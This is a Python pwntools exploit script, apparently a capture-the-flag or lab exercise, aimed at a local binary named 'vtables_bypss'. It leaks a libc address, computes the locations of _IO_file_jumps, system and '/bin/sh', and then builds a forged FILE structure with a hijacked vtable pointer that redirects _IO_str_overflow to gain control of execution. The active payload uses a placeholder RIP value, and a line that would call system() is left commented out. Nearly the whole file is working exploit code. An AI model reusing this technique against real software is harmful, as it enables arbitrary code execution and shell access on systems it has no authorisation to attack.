from pwn import *
BIN = "./vtables_bypss"

p = process(BIN)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
e = ELF(BIN)

# 
print p.recvuntil("stdout: ")
leak = int(p.recvuntil("\n").strip("\n"), 16)

# libc base
libc_base = leak - libc.symbols['_IO_2_1_stdout_']
log.info("libc_base@ "+hex(libc_base))

# _IO_file_jumps
io_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
log.info("_IO_file_jumps@ "+hex(io_file_jumps))

# _IO_str_overflow (io_file_jumps + 216 byte)
io_str_overflow = io_file_jumps + 0xd8
log.info("_IO_str_overflow@ "+hex(io_str_overflow))


# fake vtable
fake_vtable = io_str_overflow - 16
log.info("fake_vtable@ "+hex(fake_vtable))

# binsh
binsh = libc_base + next(libc.search("/bin/sh"))
log.info("binsh@ "+hex(binsh))

# system
system = libc_base + libc.symbols['system']
log.info("system@ "+hex(system))

# fp
fp = e.symbols['fp']
log.info("fp@ "+hex(fp))


payload = p64(0x0) # flags

payload += p64(0x0) # _IO_read_ptr
payload += p64(0x0) # _IO_read_end
payload += p64(0x0) # _IO_read_base

payload += p64(0x0) # _IO_write_based
payload += p64(((binsh - 100) / 2)) # _IO_write_ptr
payload += p64(0x0) # _IO_write_end

payload += p64(0x0) # _IO_buf_base
payload += p64(((binsh - 100) / 2)) # _IO_buf_end

payload += p64(0x0) # _IO_save_base
payload += p64(0x0) # _IO_backup_base
payload += p64(0x0) # _IO_save_end
payload += p64(0x0) # _IO_marker
payload += p64(0x0) # _IO_chain
payload += p64(0x0) # _fileno
payload += p64(0x0) # _old_offset

payload += p64(0x0)
payload += p64(fp + 0x80) # _lock

payload += p64(0x0)*9
payload += p64(fake_vtable) # io_file_jump overwrite
payload += p64(0x41414141) # fp->_s._allocate_buffer RIP

# payload += p64(system) # fp->_s._allocate_buffer RIP

pause()
p.send(payload)

p.interactive()